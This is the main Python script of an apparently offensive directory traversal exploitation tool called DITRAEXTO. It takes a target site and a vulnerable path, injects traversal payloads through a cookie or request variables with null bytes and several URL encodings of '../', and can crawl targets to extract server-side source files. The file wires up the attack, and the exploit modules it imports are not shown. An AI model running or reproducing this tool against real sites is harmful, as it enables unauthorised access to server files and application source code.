###############################################
#CREATED BY: DANYEL MORALES                   #
#FOR TESTING DIRECTORY TRAVERSAL VULNERABILITY#
###############################################
####################################################
#DITRAEXTO - Directory Traversal Exploitation Tool.#
####################################################
import sys
sys.path.append("classes/")
import argparse
from moduleET  import xploitDirectoryTraversal
from config  import globalConfigs
from crawler  import crawlerIt
from vol import randomImage

class DITRAEXTO:
    __domain=''
    __directory=''

    __name=''
    __filetyp=''
    __pathVuln="" #The path where the target file is.
    
    __delimiterLeft=''
    __delimiterRight=''
    
    __userPatron=""
    __complement = ''


    __objExploit=""
    __objConfigs=""
    __objCraw=""

    __chooseNumberDelimiter=None #Define the style of patern in extracting the source code.
    __chooseNumberTargets=None
    __formFile=None
    __NullByte=None
    __EncodeOpc=None
    
    __typeExploit=None
    __requestVar=None
    
    def main():
        pass
    def __init__(self):
        image=randomImage()
        self.InitializeComponent()
        self.settings()
        self.__objConfigs.deleteTemp()
        del self.__objExploit
        del self.__objConfigs
        
    def InitializeComponent(self):
        parser = argparse.ArgumentParser(description='Directory Traversal Exploitation Tool.',
                                         epilog='Ej: www.site.com /vulner_carpet/ -p wp-include/ -f content -t php')
        
        parser.add_argument("site",type=str, help="Site to be exploited")
        parser.add_argument("door",type=str, help="File or directory vulnerable.")
        
        parser.add_argument("-p","--path",type=str, help="The target path",default="")
        parser.add_argument("-f","--file",type=str, help="The target file to be extracted, without extension.",default="")
        parser.add_argument("-t","--type",type=str, help="The target extension to be extracted.",default="")

        injGrup = parser.add_argument_group('Injection Mode','You can inject using cookies(default) or using request vars(1).'+
                                               ' For request vars you have to use -v and give an argument for injection.')
        injGrup.add_argument("-ex","--exploit", type=int, choices=[1], help="Using Cookies, using post data(1) or using get data(2)",default=0)
        injGrup.add_argument("-v","--variable", type=str, help="Var for injection in a request.",default="")
        
        targetGrup = parser.add_argument_group('Targets',' You can choose using a single target (defualt), a list of targets (1) or let the program' +
                                                ' decide and exploit automatically with the medennysoft technology by crawling. (2)')
        targetGrup.add_argument("-tm", "--Tmode", type=int, choices=[1, 2],help="The targets exploitation mode.", default=0)
        targetGrup.add_argument("-co", "--CheckOff", type=int, choices=[1],help="Crawling from a list, it needed the -t argument.", default=0)

        delimitGrup = parser.add_argument_group('Delimiters',
                                                'Use -dm for delimit default patrons(0), delimit vars(1) or personal patrons(2),' +
                                                ' after that set -lp and -rp delimiter, ej: <? and ?>')
        delimitGrup.add_argument("-dm", "--Dmode", type=int, choices=[1, 2],help="Delimiters exploitation mode.", default=0)
        delimitGrup.add_argument("-lp","--leftp",type=str, help="Left common delimiter in target extension.", default="")
        delimitGrup.add_argument("-rp","--rightp",type=str, help="Right common delimiter in target extension.", default="")

        extraGrup = parser.add_argument_group("Cookie configuration","Use null byte (default) or not, set a new complement(default) to use with"+
                                              ". You can add a new variable name in cookie(default), and turn on the encoding option.(1)")
        extraGrup.add_argument("-nb","--nullbyte",type=int, help="1 - Null Byte, 0 - without Null Byte.", default=1)
        extraGrup.add_argument("-c","--complement",type=str, help="Complement for Null Byte", default=".jpg")
        extraGrup.add_argument("-C","--cookie",type=str, help="Cookie variable name to be exploited", default="language")
        extraGrup.add_argument("-e","--encode",type=int, help="Encode the cookie: 5)normal, 4)..%%5c,"+
                               " 3)%%2e%%2e%%5c, 2)..%%2f, 1)%%2e%%2e/  or %%2e%%2e\\, 0)%%2e%%2e%%2f", default=5)
        
        args = parser.parse_args()
        self.__domain=args.site
        self.__directory=args.door
        self.__name=args.file
        self.__filetyp=args.type
        self.__pathVuln=args.path
        
        self.__delimiterLeft=args.leftp
        self.__delimiterRight=args.rightp
        
        self.__chooseNumberDelimiter=args.Dmode
        self.__chooseNumberTargets=args.Tmode
        
        self.__userPatron=args.cookie
        self.__complement = args.complement
        self.__NullByte=args.nullbyte
        self.__EncodeOpc=args.encode
        self.__formFile=args.CheckOff
        self.__typeExploit=args.exploit
        self.__requestVar=args.variable
        
    def settings(self):
        ERRTEMP=None
        #BEGIN generalConfigs
        self.__objConfigs=globalConfigs(self.__domain, self.__name, self.__filetyp)
        self.__objExploit=xploitDirectoryTraversal(self.__domain, self.__directory, self.__name, self.__filetyp)
        
        self.__objConfigs.set_objeto(self.__objExploit)
        self.__objConfigs.set_pathVuln(self.__pathVuln)
        self.__objConfigs.set_patern(self.__delimiterLeft,self.__delimiterRight)
        self.__objConfigs.set_delimiter(self.__chooseNumberDelimiter)

        self.__objExploit.set_NullByte(self.__NullByte)
        self.__objExploit.set_config_head(self.__userPatron, self.__complement)
        self.__objExploit.set_EncodeOpc(self.__EncodeOpc)
        self.__objExploit.set_typeExploit(self.__typeExploit)
        self.__objExploit.set_requestVar(self.__requestVar)
        #END
        
        self.__objConfigs.createDirectory()
        
        if self.__chooseNumberTargets==0 and self.__name != "" and  self.__filetyp != "":
            self.__objConfigs.single_Set()
        elif self.__chooseNumberTargets==1:
            self.__objConfigs.automaticListCD()
            
        elif self.__chooseNumberTargets==2 or self.__name != "":
            self.crawler()

        else:
            print ("Bad option combination, try again.")

        
    def crawler(self):
        self.__objCraw=crawlerIt(self.__objConfigs)
        self.__objCraw.set_cargarDeLista(self.__formFile)
        
        if self.__formFile == 0 :
            self.__objCraw.typeTarg(self.__objConfigs.get_pathVuln()+self.__objConfigs.get_FileM(),"w")
            self.__objConfigs.single_Set()  
        self.__objCraw.principal()
            
if __name__=='__main__':
    ojPrincipal=DITRAEXTO() 
